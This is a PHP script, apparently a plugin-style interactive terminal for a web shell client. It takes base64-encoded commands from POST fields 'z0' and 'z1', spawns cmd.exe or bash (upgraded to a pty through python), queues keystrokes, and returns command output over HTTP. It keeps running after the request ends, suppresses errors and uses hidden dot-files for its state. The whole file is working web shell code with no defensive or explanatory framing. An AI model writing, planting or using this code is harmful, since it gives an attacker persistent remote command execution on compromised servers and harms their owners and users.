<?php

@set_time_limit(0);
@ignore_user_abort(true);
@ini_set('max_execution_time', 0);
@error_reporting(0);

$work_dir = getcwd();
$queue_dir = $work_dir . '/.queue';
$out_file = $work_dir . '/.output.txt';  
$pid_file = $work_dir . '/.pid.txt';     

// Ensure queue directory exists cleanly
if (!file_exists($queue_dir)) {
    @mkdir($queue_dir, 0777, true);
}

function getSafeStr($str){
    if (function_exists("mb_convert_encoding")) {
        $detected = mb_detect_encoding($str, array("UTF-8", "CP950", "BIG5", "GBK", "GB2312", "ASCII"));
        if ($detected && $detected !== "UTF-8") {
            return mb_convert_encoding($str, 'UTF-8', $detected);
        }
        return $str;
    }

    $s1 = iconv('big5', 'utf-8//IGNORE', $str);
    if(strlen($s1) > 0) {
        return $s1;
    }

    return iconv('gbk', 'utf-8//IGNORE', $str);
}

function finish() {
    @ob_end_clean();
    header("Connection: close");
    @ob_start();
    $size = ob_get_length();
    header("Content-Length: $size");
    @ob_end_flush();
    @flush();
    if (function_exists('fastcgi_finish_request')) {
        fastcgi_finish_request();
    }
}

$type = base64_decode($_POST['z0']);
$z1 = base64_decode($_POST['z1']);

$result = array("status" => "fail", "msg" => "");

if ($type == "create") {
    // Purge old queue left behind from dead instances
    if (is_dir($queue_dir)) {
        foreach (glob($queue_dir . '/*.txt') as $old_file) {
            @unlink($old_file);
        }
    }
    
    file_put_contents($out_file, '');
    file_put_contents($pid_file, 'running');

    $win = (FALSE !== strpos(strtolower(PHP_OS), 'win'));
    $shell = $z1 ? $z1 : ($win ? "cmd.exe" : "/bin/bash");

    $descriptorspec = array(
        0 => array("pipe", "r"), // stdin
        1 => array("pipe", "w"), // stdout
        2 => array("pipe", "w")  // stderr
    );

    if ($win) {
        $outputfile = sys_get_temp_dir() . DIRECTORY_SEPARATOR . "out_" . rand() . ".txt";
        $errorfile = sys_get_temp_dir() . DIRECTORY_SEPARATOR . "err_" . rand() . ".txt";
        
        @file_put_contents($outputfile, '');
        @file_put_contents($errorfile, '');
        $descriptorspec[1] = array("file", $outputfile, "a");
        $descriptorspec[2] = array("file", $errorfile, "a");
        $process = proc_open($shell, $descriptorspec, $pipes);
    } else {
        $env = array('TERM' => 'xterm');
        $process = proc_open($shell, $descriptorspec, $pipes, NULL, $env);
    }

    if (!is_resource($process)) {
        $result["msg"] = base64_encode("Failed to initialize process engine.");
        echo json_encode($result);
        exit(1);
    }

    if ($win) {
        stream_set_blocking($pipes[0], 1); 
        $reader = fopen($outputfile, "r+");
        $error = fopen($errorfile, "r+");
    } else {
        stream_set_blocking($pipes[0], 0);
        stream_set_blocking($pipes[1], 0);
        stream_set_blocking($pipes[2], 0);
        $reader = $pipes[1];
        $error = $pipes[2];
        
        $python_cmd = "python3 -c 'import pty; pty.spawn(\"$shell\")'";
        fwrite($pipes[0], "which python3 >/dev/null 2>&1 && exec $python_cmd || exec python -c 'import pty; pty.spawn(\"$shell\")'\n");
        fflush($pipes[0]);
        
        usleep(100000); 
    }

    $result["status"] = "success";
    $result["msg"] = "Engine spawned in background execution state.";
    echo json_encode($result);
    finish(); 

    // Cross-platform console loop
    $idle = 0;
    while ($idle < 1000000) {
        clearstatcache(true, $pid_file);
        if (!file_exists($pid_file) || file_get_contents($pid_file) !== 'running') {
            break;
        }

        // 1. TRANSACTIONAL QUEUE PROCESSING (Bulletproof against high-speed input typing)
        $files = glob($queue_dir . '/*.txt');
        if (!empty($files)) {
            // Sort files alphabetically to ensure strict execution order matching timestamps
            sort($files);
            $idle = 0;

            foreach ($files as $file) {
                $writeBuffer = @file_get_contents($file);
                @unlink($file); // Remove transactional chunk instantly

                if ($writeBuffer !== false && strlen($writeBuffer) > 0) {
                    fwrite($pipes[0], $writeBuffer);
                    fflush($pipes[0]);
                }
            }
        } else {
            $idle++;
        }

        // 2. stdout stream reader and convertor
        $output = "";
        while (($chunk = fread($reader, 10240)) !== false && $chunk !== "") {
            $output .= $chunk;
        }
        if ($output !== "") {
            $output = getSafeStr($output);
            file_put_contents($out_file, $output, FILE_APPEND | LOCK_EX);
        }
        if ($win) {
            @ftruncate($reader, 0);
        }

        // 3. stderr stream reader and convertor
        $errput = "";
        while (($err_chunk = fread($error, 10240)) !== false && $err_chunk !== "") {
            $errput .= $err_chunk;
        }
        if ($errput !== "") {
            $errput = getSafeStr($errput);
            file_put_contents($out_file, $errput, FILE_APPEND | LOCK_EX);
        }
        if ($win) {
            @ftruncate($error, 0);
        }

        $status = proc_get_status($process);
        if (!$status['running']) {
            break;
        }

        // Keep loop time highly reactive for responsive terminal typing
        usleep(15000); 
    }

    @fclose($pipes[0]);
    @fclose($reader);
    @fclose($error);
    @proc_terminate($process);
    @proc_close($process);
    
    @unlink($pid_file);
    if ($win) {
        @unlink($outputfile);
        @unlink($errorfile);
    }
} 

elseif ($type == "write") {
    $rawBytes = base64_decode($z1, true);
    if ($rawBytes === false) {
        $rawBytes = $z1; 
    }

    // FIX: Write keystrokes to completely unique isolated file chunks.
    // High-resolution microtime ensures perfect chronologically sorted filenames.
    $chunk_file = $queue_dir . '/' . sprintf("%015.4f", microtime(true)) . '_' . rand(1000, 9999) . '.txt';
    file_put_contents($chunk_file, $rawBytes, LOCK_EX);
    
    $result["status"] = "success";
    $result["msg"] = "Input buffer queued.";
    echo json_encode($result);
} 

elseif ($type == "read") {
    $readContent = '';
    clearstatcache(true, $out_file);
    
    if (file_exists($out_file) && filesize($out_file) > 0) {
        $fp = fopen($out_file, 'r+');
        if ($fp && flock($fp, LOCK_EX)) {
            $readContent = stream_get_contents($fp);
            ftruncate($fp, 0);
            fflush($fp);
            flock($fp, LOCK_UN);
            fclose($fp);
        }
    }

    $result["status"] = "success";
    $result["msg"] = base64_encode($readContent);
    echo json_encode($result);
} 

elseif ($type == "stop") {
    file_put_contents($pid_file, 'stopped');
    $result["status"] = "stop";
    $result["msg"] = base64_encode("Engine shutdown initiated.");
    echo json_encode($result);
}

?>